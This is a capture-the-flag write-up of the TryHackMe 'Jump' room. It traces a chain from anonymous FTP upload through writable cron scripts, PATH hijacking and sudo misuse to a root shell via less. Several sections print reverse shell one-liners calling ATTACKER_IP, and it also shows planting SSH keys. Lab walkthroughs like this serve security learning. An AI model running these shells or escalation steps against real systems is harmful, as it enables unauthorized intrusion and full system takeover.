# Jump

**Difficulty:** 🟢 Easy · **Room:** [TryHackMe ↗](https://tryhackme.com/room/jump)

You’ve discovered a misconfigured internal automation pipeline running on a Linux server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.

Your objective is to escalate from anonymous access all the way through:
<p align="center">

`anonymous access → recon_user → dev_user → monitor_user → ops_user → root`

</p>

---
## Reconnaissance

The `nmap` scan found two open ports:

![Nmap scan](images/basic_nmap_scan.png)

Since the machine had port 21 open, with an FTP service running on it, I tried anonymous FTP login which resulted in success:

![FTP login](images/ftp_anonymous.png)

After logging into FTP I found one interesting file named `README.txt`:

```text
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

It stated that all files placed in `incoming/` folder are processed automatically on arrival. Since I had access to FTP and `incoming/` I created reverse shell, uploaded it using `put` and obtained `recon_user` flag:

![First flag](images/first_flag.png)

Reverse shell used:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```
## Escalation to `dev_user`

After obtaining reverse shell as a `recon_user` I downloaded `psp64` tool and run it looking for unusual processes. Two processes that were performed regularly caught my attention:

```
2026/08/16 06:23:01 CMD: UID=1002  PID=3151   | /bin/bash /opt/dev/backup.sh 
2026/08/16 07:21:58 CMD: UID=1003  PID=2546   | /bin/bash /usr/local/bin/healthcheck 

```

The `/healthcheck` process run as a `monitor_user` and `/backup.sh` as a `dev_user`. I navigated to `/opt/dev` and inspected backup.sh:

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

![Backup.sh permissions](images/backup_permissions.png)

The backup.sh script could be modified by users, who belonged to `dev_user` group. Since the `recon_user` belonged to `dev_user` group I overwrote `backup.sh` with a reverse shell, caught a connection and obtained `dev_user` flag:

![[second_flag.png]]

Reverse shell used:

```bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1
```
## Escalation to `monitor_user`

After gaining access to `dev_user` I inspected `/healthcheck` process found earlier:

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

Also I found `ps` script owned by `dev_user` located in `/opt/dev/bin`. Since the `healthcheck` ran `ps` without specifying its path, it was possible that it ran `/opt/dev/bin/ps` instead of `/usr/bin/ps`. To confirm that I checked `/etc/systemd/system` and found `healtcheck.service`. After inspecting it I confirmed that the `healthcheck` indeed used `/opt/dev/bin/` path while looking for `ps`:

![Healthcheck path](images/healthcheck_path.png)

Knowing that I wrote reverse shell to `/opt/dev/bin/ps`, made it executable and read `monitor_user` flag:

![Third flag](images/third_flag.png)

Reverse shell used:

```bash
/bin/bash -i 5<> /dev/tcp/ATTACKER_IP/9001 0<&5 1>&5 2>&5
```
## Escalation to `ops_user`

Next I searched for files and directories that belonged to `ops_user`:

```bash
find / -user ops_user 2>/dev/null
/opt/app
/usr/local/bin/deploy.sh
/home/ops_user
```

I also run `sudo -l` which revealed that I could execute `/deploy.sh` as a `ops_user`

![Deploy as ops](images/deploy_as_ops.png)

I inspected `/deploy.sh` and found out that it executed `/deploy_helper.sh`:

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

I found `/deploy_helper.sh` script in `/opt/app` directory. This script was owned by `monitor_user` which meant that I could write reverse shell to `deploy_helper.sh` and execute `deploy.sh` as `ops_user`. Thanks to that I obtained `ops_user` flag:

![Fourth flag](images/fourth_flag.png)
 
 Reverse shell used:
 
 ```bash
 /bin/bash -i 5<> /dev/tcp/ATTACKER_IP/9000 0<&5 1>&5 2>&5
 ```
## Escalation to root

### First way — Reading the flag directly

Running `sudo -l` showed that `ops_user` was permitted to run `less` as root. This alone was enough to read `/root/flag.txt` and retrieve the final flag:

![Root flag](images/root_flag.png)

This method retrieves the flag but does not actually escalate privileges to root. `less` can normally be used to spawn a shell (`!` followed by a command), but this didn't work over the reverse shell, since that shell wasn't a fully interactive TTY. To use `less` for privilege escalation, an SSH session was required instead.

### Second way — Escalating via SSH and `less`

On the `ops_user` reverse shell, an `.ssh` directory was created with the correct permissions:

```bash
mkdir .ssh
chmod 600 .ssh
```

On the attacking machine, an SSH key pair was generated:

```bash
ssh-keygen -t ed25519 -f key
```

The contents of the public key, `key.pub`, were copied and added to `.ssh/authorized_keys` on the target, with the correct permissions set:

```bash
chmod 600 authorized_keys
```

With the key in place, it was possible to log in as `ops_user` over SSH:

```bash
ssh -i key ops_user@MACHINE_IP
```

This provided a fully interactive shell, which allowed `less` to be used as intended:

```bash
sudo less flag.txt
```

From within `less`, typing `!` followed by `/bin/bash` spawned a root shell, completing the privilege escalation:

![Root](images/root.png)

---
## Kill Chain

The attack started with **anonymous FTP access**, which allowed uploading a malicious script and gaining an initial foothold as `recon_user`.

From there, the attack progressed through several trust boundaries:

`Anonymous FTP → recon_user → dev_user → monitor_user → ops_user → root`

- **Initial Access:** Anonymous FTP upload → reverse shell as `recon_user`
- **Privilege Escalation:** Abused a writable backup script → `dev_user`
- **Privilege Escalation:** PATH hijacking through `healthcheck` → `monitor_user`
- **Privilege Escalation:** Abused `sudo` permissions and a writable deployment helper → `ops_user`
- **Final Escalation:** SSH access + `sudo less` → root shell

The machine primarily relied on **misconfigured permissions, insecure automation and trust between different users and services**, allowing the compromise to progress through the entire system.

> Thanks for reading!